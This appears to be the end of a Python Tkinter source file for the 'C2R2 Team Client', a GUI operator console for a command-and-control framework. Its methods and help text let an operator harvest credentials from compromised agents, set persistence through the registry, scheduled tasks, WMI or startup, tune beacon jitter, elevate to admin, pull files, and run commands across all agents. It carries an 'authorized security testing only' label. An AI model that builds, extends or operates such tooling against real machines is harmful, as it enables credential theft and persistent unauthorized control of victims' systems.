            self.root.after(0, lambda: self._log_console(f"📥 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=download_thread, daemon=True).start()
    
    def _harvest_credentials(self, agent_id: int):
        """Trigger credential harvesting."""
        def harvest_thread():
            success, message = self.api.harvest_credentials(agent_id)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"🔑 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=harvest_thread, daemon=True).start()
    
    def _set_persistence(self, agent_id: int, method: str):
        """Set persistence on agent."""
        def persist_thread():
            success, message = self.api.set_persistence(agent_id, method)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"📌 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=persist_thread, daemon=True).start()
    
    def _configure_beacon(self, agent_id: int, interval: int, jitter: int):
        """Configure beacon timing."""
        def beacon_thread():
            success, message = self.api.configure_beacon(agent_id, interval, jitter)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"📡 [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=beacon_thread, daemon=True).start()
    
    def _elevate_agent(self, agent_id: int):
        """Elevate agent to admin."""
        def elevate_thread():
            success, message = self.api.elevate_agent(agent_id)
            tag = 'success' if success else 'error'
            self.root.after(0, lambda: self._log_console(f"⬆️ [{agent_id}]: {message}\n", tag))
        
        threading.Thread(target=elevate_thread, daemon=True).start()
    
    def _quick_command(self, cmd: str):
        """Execute a quick action command."""
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, cmd)
        self._send_command(None)
    
    def _history_up(self, event):
        """Navigate command history up."""
        if self.cmd_history and self.history_index > 0:
            self.history_index -= 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.cmd_history[self.history_index])
    
    def _history_down(self, event):
        """Navigate command history down."""
        if self.cmd_history and self.history_index < len(self.cmd_history) - 1:
            self.history_index += 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.cmd_history[self.history_index])
        else:
            self.history_index = len(self.cmd_history)
            self.cmd_entry.delete(0, tk.END)
    
    def _show_about(self):
        """Show about dialog."""
        messagebox.showinfo(
            "About C2R2 Team Client",
            "C2R2 Team Client v2.0\n\n"
            "A graphical interface for connecting to\n"
            "C2R2 Command & Control servers via API.\n\n"
            "Architecture:\n"
            "- Server runs on red team infrastructure\n"
            "- Operators connect via HTTP/WebSocket API\n"
            "- GUI displays connected agents\n\n"
            "⚠️ FOR AUTHORIZED SECURITY TESTING ONLY"
        )
    
    def _show_commands_help(self):
        """Show commands help dialog."""
        help_text = """
📋 Client Management:
   /list                  - List all connected clients
   /select <id>           - Select a client by ID
   /deselect              - Deselect current client

💻 Command Execution:
   /cmd <command>         - Execute command on selected client
   /cmd_all <cmd>         - Execute on ALL clients

📁 File Operations:
   /download <path>       - Download file from agent

🔧 Advanced Operations:
   /harvest               - Harvest credentials
   /persist <method>      - Establish persistence (registry|task|wmi|startup)
   /beacon <int:jit>      - Configure beacon timing (e.g., 60:30)
   /elevate               - Elevate to admin (UAC prompt)

ℹ️ Other:
   /help                  - Show this help
"""
        # Create a new window for help
        help_window = tk.Toplevel(self.root)
        help_window.title("C2R2 Commands Help")
        help_window.geometry("500x500")
        help_window.configure(bg=self.colors['bg'])
        
        text = scrolledtext.ScrolledText(
            help_window,
            wrap=tk.WORD,
            bg=self.colors['bg'],
            fg=self.colors['fg'],
            font=('Consolas', 10)
        )
        text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        text.insert(tk.END, help_text)
        text.config(state=tk.DISABLED)
    
    def _on_close(self):
        """Handle window close."""
        self.running = False
        self.api.disconnect()
        self.root.destroy()
    
    def run(self):
        """Start the application."""
        self.root.mainloop()


def main():
    """Main entry point."""
    app = C2R2TeamClient()
    app.run()


if __name__ == "__main__":
    main()
